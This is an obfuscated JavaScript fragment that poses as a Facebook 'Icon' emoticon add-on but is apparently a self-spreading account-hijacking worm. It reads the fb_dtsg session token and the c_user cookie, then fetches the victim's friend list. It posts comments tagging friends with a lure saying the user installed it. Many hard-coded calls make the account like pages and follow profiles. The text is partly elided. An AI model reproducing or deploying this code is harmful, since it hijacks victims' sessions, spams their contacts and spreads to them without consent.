...
// ==============
// ==Icon==
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","1443865355848874","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," Mình cài được rồi nè, đẹp quá @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
...
;
arkadaslari_al(id);
arkadaslari_al(1443865355848874);
(function() {
...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="New ICON">'; // var navLink
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/" target="_blank"><br>Icon Facebook</a>';
	html += '</div>';
...
}P("227631610772601");P("227631674105928");
IDS("100005772909304");a("100003484711792");IDS("100006762692648");
Like("591291634294668");Like("1428056050771892");Like("517173398349954");Like("102137859949548");Like("180789375458315");P("227112934157802");P("227263040809458");
P("226838450851917");P("200195803517672");P("200194723517780");
P("226811807521248");P("225833004285795");P("225381320997630");P("225378927664536");P("202022236666872");P("224156771120085");P("263230607174207");P("200673156801780");P("202022236666872");P("198115697057526");P("194170997451996");P("130193367183093");P("193170070885422");P("161766750692421");P("128090344060062");P("115649531970810");P("141793766023053");P("163641380504958");P("121225658079864");
sublist("226913737511055");sublist("226913797511049");sublist("226914067511022");sublist("226914270844335");sublist("226914430844319");
var gid = ['591291634294668'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
